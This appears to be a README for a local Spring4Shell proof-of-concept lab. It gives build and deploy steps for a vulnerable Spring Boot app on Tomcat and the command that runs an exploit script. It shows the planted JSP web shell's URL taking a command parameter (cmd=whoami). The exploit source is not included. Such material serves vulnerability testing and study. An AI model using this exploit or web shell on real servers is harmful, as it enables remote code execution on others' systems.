# Spring4Shell POC

Description of the vulnerability: https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html

Construction of the POC: https://github.com/BobTheShoplifter/Spring4Shell-POC

## Steps to Build/Run

Tested with JDK 11.0.14, Spring Boot 2.6.5, and Apache Tomcat 9.0.60

- Run `mvn clean package` to build the application
- Rename `demo-0.0.1-SNAPSHOT.war` to `spring-poc.war` and copy this .war file to Tomcat's webapps directory
- Run `python exp.py --url http://localhost:8080/spring-poc/greeting`
  - If successful, the message `漏洞存在，shell地址为:http://localhost:8080/spring-poc/tomcatwar.jsp?pwd=j&cmd=whoami` will be logged.
  - You should now see the file `tomcatwar.jsp` written to Tomcat's webapps/spring-poc directory. This directory can be changed by modifying `exp.py`. 
    - ![Log message](images/01-log-message.png)
  - Go to the url to see the result of the shell command
    - ![Running the payload](images/02-running-the-payload.png)